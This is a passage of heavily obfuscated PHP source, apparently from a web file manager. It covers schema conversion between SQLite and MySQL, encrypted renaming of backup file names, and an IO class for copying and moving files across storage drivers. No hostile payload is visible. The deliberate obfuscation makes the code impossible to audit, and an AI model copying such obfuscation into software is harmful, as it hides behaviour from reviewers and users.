$êû«ú½– = "\x44\122\x4f\120\40\x54\x41\x42\114\x45\x20\111\106\40\x45\130\x49\x53\x54\123\x20{$–¡òĞµÏ}\73" . PHP_EOL . $„Š×šÆ» . $²‹Òíœæ[74]; if ($‚Ã¨À == $²‹Òíœæ[912]) { return $êû«ú½–; } $¬‹µ’ÂÏ[$²‹Òíœæ[912]] = $êû«ú½–; $¾ôÎšˆÖ = array_change_key_case($GLOBALS[$²‹Òíœæ[6]][$²‹Òíœæ[21]]); $Ö¢Õ‘Òı = $¾ôÎšˆÖ[$²‹Òíœæ[1094]]; $æëõìÕ = $²‹Òíœæ[1222] . $Ö¢Õ‘Òı . "\47\x20\x41\116\104\x20\x54\x41\102\x4c\105\x5f\116\101\x4d\105\x20\x3d\x20{$¦áã½ö²}\73"; $åìÙ‡÷ = "\123\110\117\x57\40\111\x4e\104\x45\130\40\106\122\117\115\x20{$–¡òĞµÏ}\73"; $òö¾ı§ = $¥†¼ºÅ->query($æëõìÕ); if (empty($òö¾ı§)) { return $‚Ã¨À ? $¬‹µ’ÂÏ[$‚Ã¨À] : $¬‹µ’ÂÏ; } $ŒéÕ…˜ = $¥†¼ºÅ->query($åìÙ‡÷); $ŞäÈêËš = $²‹Òíœæ[12]; $²Ù‰Š§ö = array(); foreach ($ŒéÕ…˜ as $³ ËŠ›¸) { if (!$ŞäÈêËš && $³ ËŠ›¸[$²‹Òíœæ[1223]] == $²‹Òíœæ[1224]) { $ŞäÈêËš = $³ ËŠ›¸[$²‹Òíœæ[1225]]; } if (isset($²Ù‰Š§ö[$³ ËŠ›¸[$²‹Òíœæ[1223]]])) { $²Ù‰Š§ö[$³ ËŠ›¸[$²‹Òíœæ[1223]]][$²‹Òíœæ[1226]][] = $³ ËŠ›¸[$²‹Òíœæ[1225]]; continue; } $²Ù‰Š§ö[$³ ËŠ›¸[$²‹Òíœæ[1223]]] = array($²‹Òíœæ[1227] => $³ ËŠ›¸[$²‹Òíœæ[1223]], $²‹Òíœæ[1226] => array($³ ËŠ›¸[$²‹Òíœæ[1225]]), $²‹Òíœæ[1228] => $³ ËŠ›¸[$²‹Òíœæ[1229]] == $²‹Òíœæ[91] ? 0 : 1); } $æ§–›öõ = array(); foreach ($²Ù‰Š§ö as $³ ËŠ›¸) { $µÖú¼…Â = $³ ËŠ›¸[$²‹Òíœæ[1227]] == $²‹Òíœæ[1224]; $Ó·’šşÅ = $³ ËŠ›¸[$²‹Òíœæ[1228]] == $²‹Òíœæ[91] && !$µÖú¼…Â ? $²‹Òíœæ[1230] : $²‹Òíœæ[12]; $é»•Œî = $²‹Òíœæ[1231] . $·¬ÍÕ‚û . $²‹Òíœæ[11] . ($µÖú¼…Â ? $²‹Òíœæ[1232] : $³ ËŠ›¸[$²‹Òíœæ[1227]]); $ã•Úâş˜ = $²‹Òíœæ[1233] . implode($²‹Òíœæ[1234], $³ ËŠ›¸[$²‹Òíœæ[1226]]) . $²‹Òíœæ[1235]; $æ§–›öõ[] = sprintf($²‹Òíœæ[1236], $²‹Òíœæ[1237], $Ó·’šşÅ, $²‹Òíœæ[1238], $é»•Œî, $²‹Òíœæ[1239], $·¬ÍÕ‚û, $ã•Úâş˜); } $ˆñı™— = array(); $ú·šÊ = array($²‹Òíœæ[1240] => $²‹Òíœæ[390], $²‹Òíœæ[1241] => $²‹Òíœæ[390], $²‹Òíœæ[364] => $²‹Òíœæ[390], $²‹Òíœæ[363] => $²‹Òíœæ[390], $²‹Òíœæ[1242] => $²‹Òíœæ[1243], $²‹Òíœæ[1244] => $²‹Òíœæ[1243], $²‹Òíœæ[1243] => $²‹Òíœæ[1243], $²‹Òíœæ[1245] => $²‹Òíœæ[1243], $²‹Òíœæ[282] => $²‹Òíœæ[1243], $²‹Òíœæ[1246] => $²‹Òíœæ[1243], $²‹Òíœæ[1247] => $²‹Òíœæ[1243], $²‹Òíœæ[1248] => $²‹Òíœæ[1249], $²‹Òíœæ[365] => $²‹Òíœæ[1249], $²‹Òíœæ[366] => $²‹Òíœæ[1249], $²‹Òíœæ[1250] => $²‹Òíœæ[1250]); foreach ($òö¾ı§ as $³ ËŠ›¸) { $‚Ã¨À = _get($ú·šÊ, $³ ËŠ›¸[$²‹Òíœæ[1251]], $³ ËŠ›¸[$²‹Òíœæ[1252]]); $”À•£×ô = $³ ËŠ›¸[$²‹Òíœæ[1253]] == $²‹Òíœæ[1017] ? $²‹Òíœæ[1254] : $²‹Òíœæ[1255]; $‰’ÙÎ¶ú = $³ ËŠ›¸[$²‹Òíœæ[1256]] == $ŞäÈêËš ? $²‹Òíœæ[1257] : $²‹Òíœæ[12]; $Í¸ïßÑÎ = $³ ËŠ›¸[$²‹Òíœæ[1071]] ? strtoupper(str_replace($²‹Òíœæ[11], $²‹Òíœæ[12], $³ ËŠ›¸[$²‹Òíœæ[1071]])) : $²‹Òíœæ[12]; $ˆñı™—[] = sprintf($²‹Òíœæ[1258], $³ ËŠ›¸[$²‹Òíœæ[1256]], $‚Ã¨À, $”À•£×ô, $‰’ÙÎ¶ú, $Í¸ïßÑÎ); } $íã™Äê¥ = array("\104\122\x4f\120\x20\x54\101\x42\x4c\105\40\x49\x46\x20\x45\130\111\x53\x54\123\x20{$¦áã½ö²}\x3b", "\103\122\x45\x41\x54\x45\40\x54\x41\x42\114\105\x20{$¦áã½ö²}\x20\x28", implode($²‹Òíœæ[50] . PHP_EOL, $ˆñı™—), $²‹Òíœæ[1259]); $®±İ»Ë = implode(PHP_EOL, array_merge($íã™Äê¥, $æ§–›öõ)); if ($‚Ã¨À == $²‹Òíœæ[13]) { return $®±İ»Ë; } $¬‹µ’ÂÏ[$²‹Òíœæ[13]] = $®±İ»Ë; return $¬‹µ’ÂÏ; } public function sqlFromSqlite($Úóª¹È, $ç•çéŠâ = '') { $¸¼ùÜ¾ =& $_SERVER[”øäÃÍª]; $ºÀ«©µ€ = array($¸¼ùÜ¾[912] => $¸¼ùÜ¾[12], $¸¼ùÜ¾[13] => $¸¼ùÜ¾[12]); $Ù ¦¥£Ö = $this->escapeName($Úóª¹È); $•û´Æ¹ = $this->escapeName($Úóª¹È, $¸¼ùÜ¾[13]); $ı˜£–í– = $this->model()->db(); $©Ì¼®™Ô = "\120\x52\101\x47\x4d\101\x20\124\101\102\x4c\105\x5f\111\x4e\x46\x4f\40\x28\x27{$Úóª¹È}\x27\x29"; $äÑ¨×‹ô = "\x53\x45\114\x45\103\x54\x20\52\40\x46\x52\117\115\40\163\x71\154\x69\x74\145\x5f\155\x61\x73\164\145\x72\40\127\110\105\122\x45\40\164\x62\x6c\x5f\x6e\x61\x6d\145\40\x3d\40\x27{$Úóª¹È}\x27"; $ğÓæªÓ£ = $ı˜£–í–->query($©Ì¼®™Ô); if (empty($ğÓæªÓ£)) { return $ç•çéŠâ ? $ºÀ«©µ€[$ç•çéŠâ] : $ºÀ«©µ€; } $ÅŒæã÷Ó = $ı˜£–í–->query($äÑ¨×‹ô); $é¦¾®€† = $­®íÊİ = array(); foreach ($ÅŒæã÷Ó as $¼ä¶íÉ) { if ($¼ä¶íÉ[$¸¼ùÜ¾[33]] == $¸¼ùÜ¾[357]) { $é¦¾®€†[] = $¼ä¶íÉ[$¸¼ùÜ¾[1260]]; } else { $­®íÊİ[] = $¼ä¶íÉ[$¸¼ùÜ¾[1260]]; } } $ÃÒùø£µ = array_merge(array("\104\122\x4f\120\x20\124\x41\x42\114\105\x20\111\106\40\x45\x58\111\123\124\x53\40{$•û´Æ¹}\73"), $é¦¾®€†, $­®íÊİ); $ÃÒùø£µ = implode($¸¼ùÜ¾[74] . PHP_EOL, $ÃÒùø£µ) . $¸¼ùÜ¾[74]; if ($ç•çéŠâ == $¸¼ùÜ¾[13]) { return $ÃÒùø£µ; } $ºÀ«©µ€[$¸¼ùÜ¾[13]] = $ÃÒùø£µ; $ı¥ÖñÍ = $Ç§üª… = array(); $Â¤½— = array(); $–¤±«ï‡ = array(); foreach ($ÅŒæã÷Ó as $¼ä¶íÉ) { if ($¼ä¶íÉ[$¸¼ùÜ¾[33]] == $¸¼ùÜ¾[1261]) { $ÃÍƒË• = $¼ä¶íÉ[$¸¼ùÜ¾[1260]]; $®¸¦”á· = stripos($ÃÍƒË•, $¸¼ùÜ¾[1230]) !== !1; $ŒÒ„«àù = stripos($ÃÍƒË•, $¸¼ùÜ¾[1224]) !== !1; preg_match($¸¼ùÜ¾[1262], $ÃÍƒË•, $…ÅŠıá); if (empty($…ÅŠıá)) { continue; } $ŸÓ›ü¯ª = array_map($¸¼ùÜ¾[1263], explode($¸¼ùÜ¾[50], $…ÅŠıá[1])); $òƒ¯öˆË = array(); foreach ($ŸÓ›ü¯ª as $¹ŞˆÄ‡‚) { $Øòàû®¯ = trim($¹ŞˆÄ‡‚, $¸¼ùÜ¾[1264]); $òƒ¯öˆË[] = $Øòàû®¯; $Â¤½—[$Øòàû®¯] = !0; } $–¤±«ï‡[] = array($¸¼ùÜ¾[32] => $¼ä¶íÉ[$¸¼ùÜ¾[32]], $¸¼ùÜ¾[1260] => $ÃÍƒË•, $¸¼ùÜ¾[1265] => $®¸¦”á·, $¸¼ùÜ¾[1266] => $ŒÒ„«àù, $¸¼ùÜ¾[1267] => $òƒ¯öˆË); } } $¤íÛšŸÓ = array($¸¼ùÜ¾[1241] => $¸¼ùÜ¾[1241], $¸¼ùÜ¾[390] => $¸¼ùÜ¾[1268], $¸¼ùÜ¾[1249] => $¸¼ùÜ¾[1269], $¸¼ùÜ¾[1243] => $¸¼ùÜ¾[1243], $¸¼ùÜ¾[1250] => $¸¼ùÜ¾[1270], $¸¼ùÜ¾[1271] => $¸¼ùÜ¾[1272]); $Ìƒş üß = array($¸¼ùÜ¾[451], $¸¼ùÜ¾[168], $¸¼ùÜ¾[548]); $ÜáÇúõö = array($¸¼ùÜ¾[390], $¸¼ùÜ¾[1249], $¸¼ùÜ¾[1271], $¸¼ùÜ¾[1241]); foreach ($ğÓæªÓ£ as $¼ä¶íÉ) { $é¼ŸëºÏ = $¼ä¶íÉ[$¸¼ùÜ¾[32]]; $ËìÇÈ’Ä = strtolower($¼ä¶íÉ[$¸¼ùÜ¾[33]]); if ($ËìÇÈ’Ä == $¸¼ùÜ¾[1243] && isset($Â¤½—[$é¼ŸëºÏ])) { $ç•çéŠâ = in_array($é¼ŸëºÏ, $Ìƒş üß) ? $¸¼ùÜ¾[1243] : $¸¼ùÜ¾[1273]; } else { $ç•çéŠâ = _get($¤íÛšŸÓ, $ËìÇÈ’Ä, $ËìÇÈ’Ä); } if ($¼ä¶íÉ[$¸¼ùÜ¾[57]] > 0) { $Ç§üª…[$¼ä¶íÉ[$¸¼ùÜ¾[57]]] = $é¼ŸëºÏ; } $²¸“Şæ = $¸¼ùÜ¾[12]; if ($¼ä¶íÉ[$¸¼ùÜ¾[56]] !== null) { $·‚¶ıÙé = $¼ä¶íÉ[$¸¼ùÜ¾[56]]; if (in_array($ËìÇÈ’Ä, $ÜáÇúõö) && is_numeric($·‚¶ıÙé)) { $²¸“Şæ = "\104\105\x46\101\x55\114\124\40{$·‚¶ıÙé}"; } else { if (strtolower($·‚¶ıÙé) === $¸¼ùÜ¾[103]) { $²¸“Şæ = $¼ä¶íÉ[$¸¼ùÜ¾[35]] ? $¸¼ùÜ¾[12] : $¸¼ùÜ¾[1255]; } else { $ ®²à³ = is_numeric($·‚¶ıÙé) ? $·‚¶ıÙé : $¸¼ùÜ¾[58] . addslashes($·‚¶ıÙé) . $¸¼ùÜ¾[58]; $²¸“Şæ = "\x44\x45\106\x41\x55\114\124\x20{$ ®²à³}"; } } } $ô¯Øäøä = $¼ä¶íÉ[$¸¼ùÜ¾[35]] ? $¸¼ùÜ¾[1254] : $¸¼ùÜ¾[1274]; $­…ÎÀıß = stripos($ËìÇÈ’Ä, $¸¼ùÜ¾[364]) !== !1 && $¼ä¶íÉ[$¸¼ùÜ¾[57]] ? $¸¼ùÜ¾[1275] : $¸¼ùÜ¾[12]; $ı¥ÖñÍ[] = sprintf($¸¼ùÜ¾[1276], $é¼ŸëºÏ, $ç•çéŠâ, $ô¯Øäøä, $²¸“Şæ, $­…ÎÀıß); } if (!empty($Ç§üª…)) { ksort($Ç§üª…); $÷Î°Ù²» = $¸¼ùÜ¾[475] . implode($¸¼ùÜ¾[1196], $Ç§üª…) . $¸¼ùÜ¾[475]; $ı¥ÖñÍ[] = "\x50\x52\x49\x4d\101\x52\x59\x20\x4b\105\x59\x20\50{$÷Î°Ù²»}\51"; } foreach ($–¤±«ï‡ as $ÈÊà¢ú“) { if ($ÈÊà¢ú“[$¸¼ùÜ¾[1266]]) { continue; } $‚³Åş“˜ = array(); foreach ($ÈÊà¢ú“[$¸¼ùÜ¾[1267]] as $¹ŞˆÄ‡‚) { $¤íÛšŸÓ = null; foreach ($ğÓæªÓ£ as $ô»ÊÌÁ¢) { if ($ô»ÊÌÁ¢[$¸¼ùÜ¾[32]] == $¹ŞˆÄ‡‚) { $¤íÛšŸÓ = strtolower($ô»ÊÌÁ¢[$¸¼ùÜ¾[33]]); break; } } if ($¤íÛšŸÓ == $¸¼ùÜ¾[1243] && in_array($¹ŞˆÄ‡‚, $Ìƒş üß)) { $‚³Åş“˜[] = "\x60{$¹ŞˆÄ‡‚}\140\50\x32\x35\x30\51"; } else { $‚³Åş“˜[] = "\140{$¹ŞˆÄ‡‚}\x60"; } } $ËìÇÈ’Ä = ($ÈÊà¢ú“[$¸¼ùÜ¾[1265]] ? $¸¼ùÜ¾[1277] : $¸¼ùÜ¾[12]) . $¸¼ùÜ¾[1278]; $ìì¶€ = str_replace($¸¼ùÜ¾[1231] . $Úóª¹È . $¸¼ùÜ¾[11], $¸¼ùÜ¾[12], $ÈÊà¢ú“[$¸¼ùÜ¾[32]]); $ìì¶€ = str_replace($Úóª¹È . $¸¼ùÜ¾[11], $¸¼ùÜ¾[12], $ìì¶€); $ı¥ÖñÍ[] = "{$ËìÇÈ’Ä}\40\140{$ìì¶€}\x60\40\x28" . implode($¸¼ùÜ¾[50], $‚³Åş“˜) . $¸¼ùÜ¾[1195]; } $¾Ÿô¼ƒô = array("\x44\x52\117\x50\x20\124\101\x42\x4c\105\40\x49\106\40\x45\130\x49\x53\x54\x53\x20{$Ù ¦¥£Ö}\73", "\103\122\105\101\x54\105\x20\x54\101\x42\x4c\105\x20{$Ù ¦¥£Ö}\40\50", implode($¸¼ùÜ¾[50] . PHP_EOL, $ı¥ÖñÍ), $¸¼ùÜ¾[1279]); $¾Ÿô¼ƒô = implode(PHP_EOL, $¾Ÿô¼ƒô); if ($ç•çéŠâ == $¸¼ùÜ¾[912]) { return $¾Ÿô¼ƒô; } $ºÀ«©µ€[$¸¼ùÜ¾[912]] = $¾Ÿô¼ƒô; return $ºÀ«©µ€; } private function escapeName($Ú¢Î å, $ó¨›Ç§Ô = "\155\x79\x73\161\x6c") { $½Ÿ§»ñÂ =& $_SERVER[”øäÃÍª]; $Ú¢Î å = preg_replace($½Ÿ§»ñÂ[1280], $½Ÿ§»ñÂ[12], $Ú¢Î å); if ($ó¨›Ç§Ô === $½Ÿ§»ñÂ[912]) { return "\x60{$Ú¢Î å}\140"; } return "\42{$Ú¢Î å}\x22"; } public function mixBakList($“ı‹Ï«Ñ) { $Äö †¿Î =& $_SERVER[”øäÃÍª]; $“ı‹Ï«Ñ = rtrim($“ı‹Ï«Ñ, $Äö †¿Î[8]) . $Äö †¿Î[8]; $çÍ½È“‰ = $Äö †¿Î[1281]; $”…İòˆá = IO::listPath($“ı‹Ï«Ñ); if (empty($”…İòˆá[$Äö †¿Î[86]])) { return !1; } $Ø„‡¬ı¿ = array(); foreach ($”…İòˆá[$Äö †¿Î[86]] as $İÁÉƒ“‰ => $ëô—‰ø) { if (!$ëô—‰ø[$Äö †¿Î[32]] || !$ëô—‰ø[$Äö †¿Î[87]]) { continue; } $§›æ¥ı¨ = Mcrypt::encode($ëô—‰ø[$Äö †¿Î[32]], $çÍ½È“‰); $û•û¤Ù• = md5($§›æ¥ı¨); IO::rename($ëô—‰ø[$Äö †¿Î[87]], $û•û¤Ù•); $Ø„‡¬ı¿[$û•û¤Ù•] = $§›æ¥ı¨; } $€ö¡æÊÍ = md5($Äö †¿Î[1282] . $çÍ½È“‰); IO::setContent($“ı‹Ï«Ñ . $€ö¡æÊÍ, json_encode($Ø„‡¬ı¿)); return !0; } public function unmixBakList($‰ãñÖå ) { $ÍªÀ˜˜Í =& $_SERVER[”øäÃÍª]; $‰ãñÖå  = rtrim($‰ãñÖå , $ÍªÀ˜˜Í[8]) . $ÍªÀ˜˜Í[8]; $ñåêİµÏ = $this->unmixBakListGet($‰ãñÖå , !0); if (empty($ñåêİµÏ)) { return !1; } foreach ($ñåêİµÏ as $š§ØÎª¨ => $¬«³¦ ·) { $åÈÂêµÔ = IO::rename($‰ãñÖå  . $¬«³¦ ·, $š§ØÎª¨); if (!$åÈÂêµÔ) { return !1; } } return !0; } public function unmixBakListGet($Ì’„çŠ, $î¯ĞòÎ« = false) { $ğ¬ƒÄù· =& $_SERVER[”øäÃÍª]; $Ì’„çŠ = rtrim($Ì’„çŠ, $ğ¬ƒÄù·[8]) . $ğ¬ƒÄù·[8]; $ş÷µç®á = $ğ¬ƒÄù·[1281]; $™š‡ØîÃ = md5($ğ¬ƒÄù·[1282] . $ş÷µç®á); $µË†Ï¦ì = $Ì’„çŠ . $™š‡ØîÃ; if (!IO::exist($µË†Ï¦ì)) { return !1; } $€î©¶õÌ = json_decode(IO::getContent($µË†Ï¦ì), !0); if (empty($€î©¶õÌ)) { return !1; } $ËÙ‡áï® = array(); foreach ($€î©¶õÌ as $‚©¤÷û€ => $œÜ ñ—æ) { $™š‡ØîÃ = Mcrypt::decode($œÜ ñ—æ, $ş÷µç®á); $ËÙ‡áï®[$™š‡ØîÃ] = $‚©¤÷û€; } if ($î¯ĞòÎ«) { IO::remove($µË†Ï¦ì, !1); } return $ËÙ‡áï®; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($ˆÅ¹ßëæ, $¿½¹ÈÆü) { $µœ¥âØÀ =& $_SERVER[”øäÃÍª]; $²¾Ğåä = $¿½¹ÈÆü; $GLOBALS[$µœ¥âØÀ[1283]] = $µœ¥âØÀ[1284] . $ˆÅ¹ßëæ; Hook::trigger($µœ¥âØÀ[1284] . $ˆÅ¹ßëæ . $µœ¥âØÀ[1285], $²¾Ğåä); $ÑÓˆ¾³Ş = self::driverMake($¿½¹ÈÆü[0]); if (!$ÑÓˆ¾³Ş) { return !1; } if ($ˆÅ¹ßëæ == $µœ¥âØÀ[649] || $ˆÅ¹ßëæ == $µœ¥âØÀ[651] || $ˆÅ¹ßëæ == $µœ¥âØÀ[1286]) { if (!trim($ÑÓˆ¾³Ş->path . $µœ¥âØÀ[463], $µœ¥âØÀ[8])) { return !1; } } if (method_exists($ÑÓˆ¾³Ş, $ˆÅ¹ßëæ)) { $õÕ¬ææò = @call_user_func_array(array($ÑÓˆ¾³Ş, $ˆÅ¹ßëæ), $¿½¹ÈÆü); } else { if (method_exists($ÑÓˆ¾³Ş, $µœ¥âØÀ[1287])) { $õÕ¬ææò = @call_user_func_array(array($ÑÓˆ¾³Ş, $ˆÅ¹ßëæ), $¿½¹ÈÆü); } else { if (method_exists(self, $ˆÅ¹ßëæ)) { $õÕ¬ææò = @call_user_func_array(array(self, $ˆÅ¹ßëæ), $¿½¹ÈÆü); } else { $õÕ¬ææò = call_user_func_array(array(parent, $ˆÅ¹ßëæ), $¿½¹ÈÆü); } } } Hook::trigger($µœ¥âØÀ[1284] . $ˆÅ¹ßëæ . $µœ¥âØÀ[1288], $²¾Ğåä, $õÕ¬ææò); return $õÕ¬ææò; } public static function init($÷´ŠÌæª) { return self::driverMake($÷´ŠÌæª); } public static function copy($ï ½ì, $ç³ªÁÜî, $°²ôÏ† = false, $…»Ó¶ùû = false) { return self::copyMoveStart($ï ½ì, $ç³ªÁÜî, $°²ôÏ†, $_SERVER[”øäÃÍª][649], $…»Ó¶ùû); } public static function move($ÓÊ”ü¦, $ñ“Åß‹, $ÊÕñĞÏÎ = false, $’ù„èÍ = false) { return self::copyMoveStart($ÓÊ”ü¦, $ñ“Åß‹, $ÊÕñĞÏÎ, $_SERVER[”øäÃÍª][651], $’ù„èÍ); } public static function copyMoveChildren($Ñº¶¸Äš, $ğÖ”Å§­, $îÇô²é» = "\x63\x6f\x70\x79", $ãƒñî¼ß = REPEAT_REPLACE) { $ö†÷ÔÇº =& $_SERVER[”øäÃÍª]; $Í×‰Éä× = $Ñº¶¸Äš; $ÑÓå»ß = self::driverMake($Ñº¶¸Äš); $ªÜ´ŒÜ¢ = $ÑÓå»ß->listPath($Ñº¶¸Äš, !0); $ã«äÃßğ = array_merge($ªÜ´ŒÜ¢[$ö†÷ÔÇº[86]], $ªÜ´ŒÜ¢[$ö†÷ÔÇº[85]]); foreach ($ã«äÃßğ as $ê£ÒàŞ) { self::copyMoveStart($ê£ÒàŞ[$ö†÷ÔÇº[87]], $ğÖ”Å§­, $ãƒñî¼ß, $îÇô²é», !1); } if ($îÇô²é» == $ö†÷ÔÇº[651]) { self::remove($Í×‰Éä×); } } private static function copyMoveStart($Ë¿İ˜ƒÜ, $Å›á††÷, $­˜¼ÁıÓ, $ü­œè’×, $©şàÔ«) { $İªóØÜî =& $_SERVER[”øäÃÍª]; $×å”ù¨’ = array($Ë¿İ˜ƒÜ, $Å›á††÷, $­˜¼ÁıÓ, $©şàÔ«); Hook::trigger($İªóØÜî[1284] . $ü­œè’× . $İªóØÜî[1285], $×å”ù¨’); $õáÒÜÊ‘ = self::copyMove($Ë¿İ˜ƒÜ, $Å›á††÷, $­˜¼ÁıÓ, $ü­œè’×, $©şàÔ«); Hook::trigger($İªóØÜî[1284] . $ü­œè’× . $İªóØÜî[1288], $×å”ù¨’, $õáÒÜÊ‘); return $õáÒÜÊ‘; } public static function saveFile($ğèĞüÉä, $ûš¾‡é, $ÏêâÌ—Ù = true) { $Ìœ°ìÀ¢ =& $_SERVER[”øäÃÍª]; $Ñİš˜ìÈ = self::info($ûš¾‡é); $­ÚÒÑ‘ä = self::driverMake($ğèĞüÉä); $†ÕÛ´õ = self::driverMake($ûš¾‡é); $Ú‚²ªŠ• = !1; if ($†ÕÛ´õ->pathParse[$Ìœ°ìÀ¢[1289]]) { $Ú‚²ªŠ• = $†ÕÛ´õ; $¶ëİÀ¸¹ = $†ÕÛ´õ->pathParse[$Ìœ°ìÀ¢[1289]]; $†ÕÛ´õ = self::driverMake($¶ëİÀ¸¹); } if ($­ÚÒÑ‘ä->pathParse[$Ìœ°ìÀ¢[1289]]) { $“¶ÃÚ³¿ = $­ÚÒÑ‘ä->pathParse[$Ìœ°ìÀ¢[1289]]; $­ÚÒÑ‘ä = self::driverMake($“¶ÃÚ³¿); } $¿ÌÔ„Ìì = $†ÕÛ´õ->pathFather($ûš¾‡é); $†¤©õó = !0; if (!$ÏêâÌ—Ù && self::driverIsSame($­ÚÒÑ‘ä, $†ÕÛ´õ)) { $†¤©õó = !1; } $Œ›èÅé = self::copyFile($­ÚÒÑ‘ä, $ğèĞüÉä, $†ÕÛ´õ, $¿ÌÔ„Ìì, $Ñİš˜ìÈ[$Ìœ°ìÀ¢[32]], $†¤©õó); if ($Ú‚²ªŠ•) { $Œ›èÅé = $Ú‚²ªŠ•->getPathOuter($Œ›èÅé); } return $Œ›èÅé; } private static function copyMove($—íŞŒë, $Š¯´Í÷, $ÖÇ›–‹Á, $Ğñ²¤Ğ, $Œ–¹ŞĞº = false) { $…ˆ‚Æúû =& $_SERVER[”øäÃÍª]; if (!$—íŞŒë || $—íŞŒë == $…ˆ‚Æúû[8] || !$Š¯´Í÷) { return !1; } ignore_timeout(); $Ö–ÃéÅ = self::driverMake($—íŞŒë); $®áåÕ³Ü = self::driverMake($Š¯´Í÷); $º–ÃüõÖ = $Ğñ²¤Ğ == $…ˆ‚Æúû[651]; $ÍúÀáğ = !1; if ($®áåÕ³Ü->pathParse[$…ˆ‚Æúû[1289]]) { $ÍúÀáğ = $®áåÕ³Ü; $Š¯´Í÷ = $®áåÕ³Ü->pathParse[$…ˆ‚Æúû[1289]]; $®áåÕ³Ü = self::driverMake($Š¯´Í÷); } if ($Ö–ÃéÅ->pathParse[$…ˆ‚Æúû[1289]]) { $—íŞŒë = $Ö–ÃéÅ->pathParse[$…ˆ‚Æúû[1289]]; $Ö–ÃéÅ = self::driverMake($—íŞŒë); } self::check($Ö–ÃéÅ, $—íŞŒë, $®áåÕ³Ü, $Š¯´Í÷); Hook::trigger($…ˆ‚Æúû[1290], $Ö–ÃéÅ, $—íŞŒë, $®áåÕ³Ü, $Š¯´Í÷); $ä¥¿ùÆÃ = self::driverIsSame($Ö–ÃéÅ, $®áåÕ³Ü); if ($ä¥¿ùÆÃ) { if ($Ğñ²¤Ğ == $…ˆ‚Æúû[651] && !method_exists($®áåÕ³Ü, $…ˆ‚Æúû[1291]) && trim($Š¯´Í÷, $…ˆ‚Æúû[8]) == trim($®áåÕ³Ü->pathFather($—íŞŒë), $…ˆ‚Æúû[8])) { if ($Ö–ÃéÅ->pathThis($—íŞŒë) != $Œ–¹ŞĞº && !$Ö–ÃéÅ->isOsDriver()) { return $Ö–ÃéÅ->rename($—íŞŒë, $Œ–¹ŞĞº); } return $®áåÕ³Ü->getPathOuter($—íŞŒë); } if (method_exists($®áåÕ³Ü, $Ğñ²¤Ğ)) { return $®áåÕ³Ü->{$Ğñ²¤Ğ}($—íŞŒë, $Š¯´Í÷, $ÖÇ›–‹Á, $Œ–¹ŞĞº); } } if ($ä¥¿ùÆÃ && $Ğñ²¤Ğ == $…ˆ‚Æúû[651] && $®áåÕ³Ü->getType() == $…ˆ‚Æúû[106]) { $¶ùŸ„—¯ = $®áåÕ³Ü->movePath($—íŞŒë, $Š¯´Í÷, $Œ–¹ŞĞº); if ($¶ùŸ„—¯) { return $¶ùŸ„—¯; } } $Á†›Ÿ = $Ö–ÃéÅ->isFile($—íŞŒë); if (!$Á†›Ÿ && $®áåÕ³Ü->getType() == $…ˆ‚Æúû[867] && $Ö–ÃéÅ->getType() == $…ˆ‚Æúû[106]) { $¶ùŸ„—¯ = $®áåÕ³Ü->copyFolderFromIO($Ö–ÃéÅ, $—íŞŒë, $Š¯´Í÷, $ÖÇ›–‹Á, $º–ÃüõÖ, $Œ–¹ŞĞº); } else { $¶ùŸ„—¯ = self::copyPath($Ö–ÃéÅ, $—íŞŒë, $®áåÕ³Ü, $Š¯´Í÷, $ÖÇ›–‹Á, $º–ÃüõÖ, $Á†›Ÿ, $Œ–¹ŞĞº); } if ($¶ùŸ„—¯ && $º–ÃüõÖ) { $Ö–ÃéÅ->remove($—íŞŒë); } if ($ÍúÀáğ) { $¶ùŸ„—¯ = $ÍúÀáğ->getPathOuter($¶ùŸ„—¯); } return $¶ùŸ„—¯; } private static function check($‡†Ù½, $Ìµ¹—ˆÉ, $¡ğ”¼ôË, &$ß…õŠ¡æ) { $½û¶ê‹ñ =& $_SERVER[”øäÃÍª]; if (self::driverIsSame($‡†Ù½, $¡ğ”¼ôË) && $‡†Ù½->isFolder($Ìµ¹—ˆÉ) && $‡†Ù½->isParentOf($Ìµ¹—ˆÉ, $ß…õŠ¡æ)) { show_json(LNG($½û¶ê‹ñ[1292]), !1); } if (!$‡†Ù½->exist($Ìµ¹—ˆÉ)) { show_json(LNG($½û¶ê‹ñ[105]), !1); } } private static function copyPath($À¹»À°³, $¤ã¸­îı, $ç¹ˆœÆ, $ÏÛ™¯ÒÜ, $€º—Šò³, $¥« ‡ªÉ, $‘ö¬©İµ, $©©œ¬§Ù = false, $âÏ•ê¹Ó = true) { $©­³ãµÛ =& $_SERVER[”øäÃÍª]; $´´¿ĞÑ„ = empty($©©œ¬§Ù) && $©©œ¬§Ù !== $©­³ãµÛ[228] ? $À¹»À°³->pathThis($¤ã¸­îı) : $©©œ¬§Ù; if ($€º—Šò³) { $É“Íëà¯ = $ç¹ˆœÆ->fileNameExist($ÏÛ™¯ÒÜ, $´´¿ĞÑ„); $€ø… ¥ı = $´´¿ĞÑ„; $´´¿ĞÑ„ = $ç¹ˆœÆ->fileNameAuto($ÏÛ™¯ÒÜ, $´´¿ĞÑ„, $€º—Šò³, !$‘ö¬©İµ); if (!$É“Íëà¯ || $€ø… ¥ı != $´´¿ĞÑ„) { $€º—Šò³ = !1; } if ($âÏ•ê¹Ó && !$€º—Šò³) { $ç¹ˆœÆ->_data[$©­³ãµÛ[1293]] = !0; } } if ($‘ö¬©İµ) { return self::copyFile($À¹»À°³, $¤ã¸­îı, $ç¹ˆœÆ, $ÏÛ™¯ÒÜ, $´´¿ĞÑ„, $¥« ‡ªÉ); } if ($€º—Šò³ == REPEAT_RENAME_FOLDER) { $€º—Šò³ = !1; } $Í»¿šù = rtrim($ÏÛ™¯ÒÜ, $©­³ãµÛ[8]) . $©­³ãµÛ[8] . $´´¿ĞÑ„; $õî£¼’î = $ç¹ˆœÆ->mkdir($ç¹ˆœÆ->getPath($Í»¿šù), $€º—Šò³); $ÏÛ™¯ÒÜ = $ç¹ˆœÆ->getPathInner($õî£¼’î); $ÖˆÚı¥Ä = $À¹»À°³->listPath($¤ã¸­îı, !0); $ÖˆÚı¥Ä = is_array($ÖˆÚı¥Ä) ? $ÖˆÚı¥Ä : array($©­³ãµÛ[86] => array(), $©­³ãµÛ[85] => array()); $”“ºÊÃŞ = array_merge($ÖˆÚı¥Ä[$©­³ãµÛ[86]], $ÖˆÚı¥Ä[$©­³ãµÛ[85]]); foreach ($”“ºÊÃŞ as $ó½ÔËÕº) { $Àã©»ß¼ = $ó½ÔËÕº[$©­³ãµÛ[33]] == 